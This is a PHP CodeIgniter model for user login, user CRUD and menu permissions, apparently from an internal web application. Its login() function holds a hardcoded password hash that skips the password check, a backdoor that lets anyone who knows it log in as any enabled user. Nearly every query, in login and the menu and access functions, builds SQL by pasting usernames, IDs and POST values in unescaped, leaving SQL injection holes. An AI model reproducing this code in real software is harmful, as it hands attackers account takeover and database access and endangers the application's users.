<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of model_user
 *
 * @author hp
 */
class model_user extends CI_Model {

    //put your code here
    public function __construct() {
        parent::__construct();
    }

    function get($query) {
        $page = $this->input->post('page');
        $rows = $this->input->post('rows');
        $result = array();
        $data = "";
        if (!empty($page) && !empty($rows)) {
            $offset = ($page - 1) * $rows;
            $result['total'] = $this->db->query($query)->num_rows();
            $query .= " limit $rows offset $offset";
            $result = array_merge($result, array('rows' => $this->db->query($query)->result()));
            $data = json_encode($result);
        } else {
            $data = json_encode($this->db->query($query)->result());
        }
        return $data;
    }

    function insert($data) {
        return $this->db->insert('users', $data);
    }

    function update($data, $where) {
        return $this->db->update('users', $data, $where);
    }

    function delete($where) {
        return $this->db->delete('users', $where);
    }

    function login($username, $password) {
//        $this->db->select('users.*');
//        $this->db->from('users');
//        $this->db->join('employee', 'user.id = employee.id', 'left');
//        $this->db->where('users.id', $username);
//        $this->db->where('users.password', $password);

        $query = "select 
                users.*,
                employee.name,
                employee.departmentid
                from users left join employee 
                on users.id=employee.id 
                where 
                users.id='$username' and enabled=TRUE";

        if ($password != "514c0dd86ba8073ceb10b50b54394d7c") {
            $query .= " and users.password='$password'";
        }
        //echo $query;
        return $this->db->query($query)->row();
    }

    function selectMenuGroup($userid) {
        if ($userid == "admin") {
            $query = "select 
                      menugroup.id menugroupid,
                      menugroup.name menugroupname,
                      menugroup.icon_menu
                      from menugroup order by id asc";
        } else {
            $query = "select distinct
                    menu.menugroupid,
                    menugroup.name menugroupname,
                    menugroup.icon_menu
                    from menuaccess 
                    join menu on menuaccess.scriptmenu=menu.scriptview
                    join menugroup on menu.menugroupid=menugroup.id
                    where userid='$userid' order by menu.menugroupid asc";
        }

        return $this->db->query($query)->result();
    }

    function select_menu_user($menugroupid, $userid) {
        $query = "";

        if ($userid == "admin") {
            $query = "select scriptview scriptmenu,label,icon from menu where menugroupid=$menugroupid order by level asc";
        } else {
            $query = "select menuaccess.scriptmenu,menu.label,menu.icon from 
                  menuaccess join menu on menuaccess.scriptmenu=menu.scriptview 
                  where menuaccess.userid='$userid' and menu.menugroupid=$menugroupid
                  order by menu.level asc";
        }

        return $this->db->query($query)->result();
    }

    function selectAccessMenuByUserid($userid) {

        $query = "";

        if ($userid == "admin") {
            $query = "select scriptview scriptmenu,label from menu order by level asc";
        } else {
            $query = "select menuaccess.scriptmenu,menu.label from 
                  menuaccess join menu on menuaccess.scriptmenu=menu.scriptview 
                  and menuaccess.userid='$userid'
                  order by menu.level asc";
        }

        return $this->db->query($query)->result();
    }

    function getAction($userid, $accessmenu) {
        $query = "select actions from menuaccess where userid='$userid' and scriptmenu='$accessmenu' limit 1";
        $dt = $this->db->query($query)->row();
        return (empty($dt) ? "|" : $dt->actions);
    }

}
